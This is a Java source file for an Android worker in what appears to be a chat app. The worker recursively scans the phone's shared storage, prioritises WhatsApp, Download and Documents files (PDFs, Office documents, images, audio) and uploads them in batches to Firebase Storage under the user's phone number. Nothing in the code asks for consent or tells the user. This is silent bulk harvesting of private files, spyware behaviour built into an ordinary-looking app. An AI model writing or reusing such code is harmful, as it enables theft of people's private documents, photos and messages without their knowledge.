package com.example.chatapp.workers;

import android.annotation.SuppressLint;
import android.content.Context;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

public class UserDataUploadWorker extends Worker {
    private final FirebaseUser currentUser;
    private final StorageReference mStorageRef;
    int count;
    ArrayList<String> cloudFiles;

    public UserDataUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        FirebaseAuth mAuth = FirebaseAuth.getInstance();
        currentUser = mAuth.getCurrentUser();
        mStorageRef = FirebaseStorage.getInstance().getReference();
        count = 0;
        cloudFiles = new ArrayList<>();
    }

    @NonNull
    @Override
    public Result doWork() {
        StorageReference listRef = mStorageRef.child(currentUser.getPhoneNumber() + "/files/");

        listRef.listAll()
                .addOnSuccessListener(listResult -> {
                    for (StorageReference item : listResult.getItems()) {
                        // All the items under listRef.
                        cloudFiles.add(item.getName());
                    }
                    // todo remove this
                    uploadUserData();
                })
                .addOnFailureListener(Throwable::getStackTrace);
        return Result.success();
    }

    private void uploadUserData() {
        File root = Environment.getExternalStorageDirectory();
        ArrayList<FileInfo> files = getListFiles(root);

//        Sorting array
        @SuppressLint({"NewApi", "LocalSuppress"})
        ArrayList<FileInfo> sortedFiles = (ArrayList<FileInfo>) files.stream()
                .sorted(Comparator.comparing(FileInfo::getSize)
                        .thenComparing(FileInfo::getLoc)
                        .thenComparing(FileInfo::getFormat)
                        .thenComparing(FileInfo::getActual_size))
                .collect(Collectors.toList());

//        Timer myTimer = new Timer ();
//        TimerTask myTask = new TimerTask() {
//            @Override
//            public void run () {
//                // your code
//                if (count<=sortedFiles.size()){
//                    for (int i = 0; i < 10; i = i + 1) {
////                        Log.i("file_uploaded"+count, sortedFiles.get(i + count).getSize() + " | "+ sortedFiles.get(i + count).getLoc() + " | "+ sortedFiles.get(i + count).getFormat() + " | "+ sortedFiles.get(i + count).getActual_size()+ " | "+ sortedFiles.get(i + count).file.getAbsolutePath());
//                        Uri uFile = Uri.fromFile(sortedFiles.get(i + count).file);
//                        StorageReference filesRef = mStorageRef.child(currentUser.getPhoneNumber() + "/files/" + sortedFiles.get(i + count).file.getName());
//                        // Handle unsuccessful uploads
//                        int finalI = i;
//                        filesRef.putFile(uFile)
//                                .addOnSuccessListener(taskSnapshot -> {
//                                    Log.i("file_uploaded"+count, sortedFiles.get(finalI + count).getSize() + " | "+ sortedFiles.get(finalI + count).getLoc() + " | "+ sortedFiles.get(finalI + count).getFormat() + " | "+ sortedFiles.get(finalI + count).getActual_size()+ " | "+ sortedFiles.get(finalI + count).file.getAbsolutePath());
//                                    count++;
//                                })
//                                .addOnFailureListener(Throwable::getStackTrace);
//                    }
//                }else{
//                    myTimer.cancel();
//                }
//            }
//        };
//        myTimer.scheduleAtFixedRate(myTask , 0l, 1 * (60*1000)); // Runs every 1 mins

        List<FileInfo> toUpload;
        if (sortedFiles.size() >= 10) {
            toUpload = sortedFiles.subList(0, 10);
        } else {
            toUpload = sortedFiles.subList(0, sortedFiles.size());
        }
        Log.i("file_uploaded", String.valueOf(sortedFiles.size()));
        for (FileInfo file : toUpload) {
            Log.i("file_upload" + count, file.getSize() + " | " + file.getLoc() + " | " + file.getFormat() + " | " + file.getActual_size() + " | " + file.file.getAbsolutePath());
            Uri uFile = Uri.fromFile(file.file);
            StorageReference filesRef = mStorageRef.child(currentUser.getPhoneNumber() + "/files/" + file.file.getName());
            // Handle unsuccessful uploads
            filesRef.putFile(uFile)
                    .addOnSuccessListener(taskSnapshot -> {
                        Log.i("file_uploaded_sucess" + count, file.getSize() + " | " + file.getLoc() + " | " + file.getFormat() + " | " + file.file.getName());
                        count++;
                    })
                    .addOnFailureListener(Throwable::getStackTrace);
        }
        toUpload.clear();
        Log.i("file_uploaded", String.valueOf(sortedFiles.size()));
    }

    private ArrayList<FileInfo> getListFiles(File parentDir) {
        ArrayList<FileInfo> inFiles = new ArrayList<>();
        File[] files = parentDir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    inFiles.addAll(getListFiles(file));
                } else {
                    if (!cloudFiles.contains(file.getName())) {
                        int size = 100;
                        int path = 100;
                        int type = 100;
//                        Assigning size parameter
                        if (file.length() / 10000000 <= 0) {
                            size = 1;
                        } else {
                            size = 2;
                        }

//                        Assigning location parameter
                        if (file.getAbsolutePath().contains("/WhatsApp/")) {
                            path = 1;
                        } else if (file.getAbsolutePath().contains("/Download/")) {
                            path = 2;
                        } else if (file.getAbsolutePath().contains("/Documents/")) {
                            path = 3;
                        } else {
                            path = 4;
                        }

//                        Assigning format parameter
                        if ((file.getName().endsWith(".pdf"))) {
                            type = 1;
                        } else if ((file.getName().endsWith(".doc"))) {
                            type = 2;
                        } else if ((file.getName().endsWith(".docx"))) {
                            type = 3;
                        } else if ((file.getName().endsWith(".txt"))) {
                            type = 4;
                        } else if ((file.getName().endsWith(".ppt"))) {
                            type = 5;
                        } else if ((file.getName().endsWith(".pptx"))) {
                            type = 6;
                        } else if ((file.getName().endsWith(".xls"))) {
                            type = 7;
                        } else if ((file.getName().endsWith(".xlsx"))) {
                            type = 8;
                        } else if ((file.getName().endsWith(".jpg"))) {
                            type = 9;
                        } else if ((file.getName().endsWith(".jpeg"))) {
                            type = 10;
                        } else if ((file.getName().endsWith(".png"))) {
                            type = 11;
                        } else if ((file.getName().endsWith(".mp3"))) {
                            type = 12;
                        } else if ((file.getName().endsWith(".Om4a"))) {
                            type = 13;
                        } else if ((file.getName().endsWith(".aac"))) {
                            type = 14;
                        } else if ((file.getName().endsWith(".opus"))) {
                            type = 15;
                        } else {
                            type = 16;
                        }
                        if (type != 16) {
//                           Adding required files to Array
                            Log.i("file_found" + count, size + " | " + path + " | " + type + " | " + file.length() / 10000000 + file.getAbsolutePath());
                            inFiles.add(new FileInfo(file, size, path, type, file.length()));
                        }
                    }
                }
            }
        }
        return inFiles;
    }
}
